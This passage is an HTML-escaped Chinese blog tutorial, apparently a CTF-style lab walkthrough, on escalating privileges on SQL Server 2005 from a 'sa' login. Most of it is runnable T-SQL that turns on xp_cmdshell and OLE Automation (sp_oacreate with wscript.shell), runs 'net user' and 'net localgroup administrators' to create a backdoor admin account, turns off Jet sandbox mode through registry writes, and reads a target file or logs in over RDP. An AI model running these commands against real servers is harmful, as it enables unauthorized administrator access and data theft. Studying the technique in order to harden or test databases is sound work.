class=&#34;comment&#34;&gt;--恢复语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--2.sp_oacreate提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net user HeyJack1 HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net localgroup administrators HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--3.沙盒提权(不常用，所以没粘贴出来)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-环境准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-环境准备&#34;&gt;#&lt;/a&gt; 0x01 环境准备&lt;/h2&gt;
&lt;p&gt;输入用户名和密码，以 &lt;code&gt;sa&lt;/code&gt;  身份登录 SQL Server2005&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927205858375.png&#34; alt=&#34;image-20220927205858375&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录后可以看到这样的界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210049933.png&#34; alt=&#34;image-20220927210049933&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先我们了解下什么是 sp_configure？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210431221.png&#34; alt=&#34;image-20220927210431221&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 &lt;code&gt;show advanced options&lt;/code&gt;  为 &lt;code&gt;1&lt;/code&gt; ，可以显示高级选项。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;USE master;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GO  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。&lt;/p&gt;
&lt;h2 id=&#34;0x02-xp_cmdshell提权步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-xp_cmdshell提权步骤&#34;&gt;#&lt;/a&gt; 0x02 xp_cmdshell 提权步骤&lt;/h2&gt;
&lt;h3 id=&#34;1第一步更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1第一步更改当前服务器的全局配置首选高级选项为1&#34;&gt;#&lt;/a&gt; ①第一步，更改当前服务器的全局配置首选高级选项为 1&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#以下大写字母均可小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211220768.png&#34; alt=&#34;image-20220927211220768&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用鼠标选中一行，然后右键选择执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211614093.png&#34; alt=&#34;image-20220927211614093&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2第二步打开cmd-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2第二步打开cmd-shell&#34;&gt;#&lt;/a&gt; ②第二步，打开 cmd-shell&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211736845.png&#34; alt=&#34;image-20220927211736845&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3第三步输入你想执行的windows-cmd命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3第三步输入你想执行的windows-cmd命令&#34;&gt;#&lt;/a&gt; ③第三步，输入你想执行的 windows cmd 命令。&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211958154.png&#34; alt=&#34;image-20220927211958154&#34;&gt;&lt;/p&gt;
&lt;p&gt;言归正传，我们为系统添加属于 &lt;code&gt;攻击者自己的net user账户&lt;/code&gt;  (主要目的是使用已知的用户名和密码)&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#比如，账户名是HeyJack 密码也是HeyJack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212339481.png&#34; alt=&#34;image-20220927212339481&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时，我们在 windows 的 cmd 里，执行 net user&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212609276.png&#34; alt=&#34;image-20220927212609276&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;quot;开始&amp;quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于&lt;/p&gt;
&lt;p&gt;查看当前分组在 Users 组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212746484.png&#34; alt=&#34;image-20220927212746484&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4第四步将你新建的用户移到administrators组&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4第四步将你新建的用户移到administrators组&#34;&gt;#&lt;/a&gt; ④第四步，将你新建的用户移到 administrators 组&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213122417.png&#34; alt=&#34;image-20220927213122417&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续查看我们的分组情况，可以看到，提权成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213219218.png&#34; alt=&#34;image-20220927213219218&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;5第五步获取远程服务器中的目标文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5第五步获取远程服务器中的目标文件&#34;&gt;#&lt;/a&gt; ⑤第五步，获取远程服务器中的目标文件&lt;/h3&gt;
&lt;p&gt;我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 &lt;code&gt;最终目的&lt;/code&gt; 就是&lt;strong&gt;为了获取它&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221944235.png&#34; alt=&#34;image-20220927221944235&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第一种方案3389远程连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一种方案3389远程连接&#34;&gt;#&lt;/a&gt; 第一种方案，3389 远程连接&lt;/h4&gt;
&lt;p&gt;在 win+R 输入 &lt;code&gt;mstsc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213803912.png&#34; alt=&#34;image-20220927213803912&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221540178.png&#34; alt=&#34;image-20220927221540178&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 3389 远程连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213905588.png&#34; alt=&#34;image-20220927213905588&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入刚刚新建的用户民和密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214036680.png&#34; alt=&#34;image-20220927214036680&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214149105.png&#34; alt=&#34;image-20220927214149105&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221815971.png&#34; alt=&#34;image-20220927221815971&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第二种方案使用sql提权命令获取内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二种方案使用sql提权命令获取内容&#34;&gt;#&lt;/a&gt; 第二种方案，使用 SQL 提权命令获取内容&lt;/h4&gt;
&lt;p&gt;另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#dir命令查看当前路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;dir&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\Documents &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; Settings\桌面\flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\Administrator\桌面\flag.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221113281.png&#34; alt=&#34;image-20220927221113281&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-sp_oacreate提权步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-sp_oacreate提权步骤&#34;&gt;#&lt;/a&gt; 0x03 sp_oacreate 提权步骤&lt;/h2&gt;
&lt;h3 id=&#34;1第一步更改当前服务器的全局配置首选高级选项为1-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1第一步更改当前服务器的全局配置首选高级选项为1-2&#34;&gt;#&lt;/a&gt; ①第一步，更改当前服务器的全局配置首选高级选项为 1&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2第二步配置ole过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2第二步配置ole过程&#34;&gt;#&lt;/a&gt; ②第二步，配置 OLE 过程&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3第三步定义shell变量int类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3第三步定义shell变量int类型&#34;&gt;#&lt;/a&gt; ③第三步，定义 shell 变量，int 类型。&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4第四步生成shell对象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4第四步生成shell对象&#34;&gt;#&lt;/a&gt; ④第四步，生成 shell 对象&lt;/h3&gt;
&lt;p&gt;将结果赋值给第③步生成的 shell 变量里头。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5第五步调用shell对象的run方法来调用net-user&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5第五步调用shell对象的run方法来调用net-user&#34;&gt;#&lt;/a&gt; ⑤第五步，调用 shell 对象的 run 方法来调用 net user&lt;/h3&gt;
&lt;p&gt;返回值是 null，方法体是执行 system32 目录下的 cmd.exe，并使用 net user 生成 HeyJack1 账号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net user HeyJack1 HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927230925606.png&#34; alt=&#34;image-20220927230925606&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;6第六步调用shell对象的run方法来调用net-localgroup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6第六步调用shell对象的run方法来调用net-localgroup&#34;&gt;#&lt;/a&gt; ⑥第六步，调用 shell 对象的 run 方法来调用 net localgroup&lt;/h3&gt;
&lt;p&gt;返回值是 null，方法体是执行 cmd，并使用 net localgroup 将 HeyJack1 挪到 administrators 组下&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net localgroup administrators HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927231033604.png&#34; alt=&#34;image-20220927231033604&#34;&gt;&lt;/p&gt;
&lt;p&gt;以上是使用 sp_oacreate 的提权语句，主要是用来调用 OLE 对象（Object Linking and Embedding 的缩写，VB 中的 OLE 对象），利用 OLE 对象的 run 方法执行系统命令。&lt;/p&gt;
&lt;p&gt;在 oacreate 的官方文档里明确指出了，如果要使用 OLE 对象，必须要开启 ‘Ole Automation Procedures’，也就是 EXEC sp_configure ‘Ole Automation Procedures’, 1;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行上面这条语句前&lt;/strong&gt;要执行 &lt;code&gt;exec sp_configure &#39;show advanced options&#39;, 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;官方对这句话的解释是：&lt;/strong&gt; &lt;code&gt;show advanced options&lt;/code&gt; ,**“显示高级选项”** 选项用来显示 sp_configure 系统存储过程高级选项。&lt;/p&gt;
&lt;p&gt;当 **“显示高级选项”** 设置为 &lt;code&gt; 1&lt;/code&gt;  时，可以使用 sp_configure 列出高级选项。  &lt;code&gt;默认值为 0&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-沙盒提权步骤不常用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-沙盒提权步骤不常用&#34;&gt;#&lt;/a&gt; 0x04 沙盒提权步骤 (不常用)&lt;/h2&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--提权语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;-- 不开启的话在执行xp_regwrite会提示让我们开启，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ad Hoc Distributed Queries&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_regwrite &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;REG_DWORD&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master.dbo.xp_regread &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 